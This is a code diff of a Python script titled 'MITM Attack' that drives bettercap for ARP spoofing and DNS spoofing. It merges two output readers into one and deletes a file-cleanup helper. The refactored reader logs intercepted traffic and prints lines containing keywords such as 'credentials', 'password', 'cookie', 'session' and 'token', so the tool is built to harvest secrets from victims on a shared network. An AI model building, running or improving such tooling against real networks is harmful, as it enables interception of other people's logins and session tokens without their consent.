@@ -43,17 +43,6 @@ def load_hosts(json_file: str):
 
     return hosts, data
 
-def delete_scan_files(prefix: Path):
-    prefix = prefix.with_suffix("") 
-    suffixes = [".json"]
-    for suf in suffixes:
-        f = Path(str(prefix) + suf)
-        if f.exists():
-            try:
-                os.remove(f)
-            except Exception:
-                pass
-
 def show_menu():
     print("\n" + "=" * 50)
     print(" MITM Attack ")
@@ -62,32 +51,14 @@ def show_menu():
     print("2. DNS Spoofing")
     print("3. Exit")
 
-def output_reader(proc, stop_event, show_output, log_file, target_ip):
-    important_keywords = [
+def output_reader(proc, stop_event, show_output, mode="arp", log_file=None, target_ip=None):
+    arp_keywords = [
         'http.request', 'https.request', 'dns.request',
         'credentials', 'password', 'login', 'user', 'auth',
         'cookie', 'session', 'token', 'POST', 'GET',
         'sniff.', 'arp.spoof'
     ]
-    
-    while not stop_event.is_set():
-        try:
-            if proc.stdout:
-                line = proc.stdout.readline()
-                if line:
-                    stripped = line.strip()
-                    if stripped and show_output.is_set():
-                        log_file.write(stripped + "\n")
-                        log_file.flush()
-                        
-                        if any(kw.lower() in stripped.lower() for kw in important_keywords):
-                            print(f"  {stripped}", flush=True)
-                elif proc.poll() is not None:
-                    break
-        except:
-            break
 
-def output_reader_dns(proc, stop_event, show_output):
     while not stop_event.is_set():
         try:
             if proc.stdout:
@@ -95,8 +66,14 @@ def output_reader_dns(proc, stop_event, show_output):
                 if line:
                     stripped = line.strip()
                     if stripped and show_output.is_set():
-                        if 'dns.spoof' in stripped or 'spoofed' in stripped.lower() or 'sending' in stripped.lower():
-                            print(f"  {stripped}", flush=True)
+                        if mode == "arp":
+                            log_file.write(stripped + "\n")
+                            log_file.flush()
+                            if any(kw.lower() in stripped.lower() for kw in arp_keywords):
+                                print(f"  {stripped}", flush=True)
+                        elif mode == "dns":
+                            if 'dns.spoof' in stripped or 'spoofed' in stripped.lower() or 'sending' in stripped.lower():
+                                print(f"  {stripped}", flush=True)
                 elif proc.poll() is not None:
                     break
         except:
@@ -136,7 +113,7 @@ def run_bettercap(iface="wlan0", target_ip=None, gateway_ip=None):
     
     stop_event = threading.Event()
     show_output = threading.Event() 
-    output_thread = threading.Thread(target=output_reader, args=(proc, stop_event, show_output, log_file, target_ip), daemon=True)
+    output_thread = threading.Thread(target=output_reader, args=(proc, stop_event, show_output,"arp", log_file, target_ip), daemon=True)
     output_thread.start()
     
     print("Initializing...")
@@ -209,7 +186,7 @@ def run_dns_spoof(iface="wlan0", target_ip=None, gateway_ip=None, spoof_domain=N
     
     stop_event = threading.Event()
     show_output = threading.Event()
-    output_thread = threading.Thread(target=output_reader_dns, args=(proc, stop_event, show_output), daemon=True)
+    output_thread = threading.Thread(target=output_reader, args=(proc, stop_event, show_output, "dns", None, None), daemon=True)
     output_thread.start()
     
     print("Initializing...")
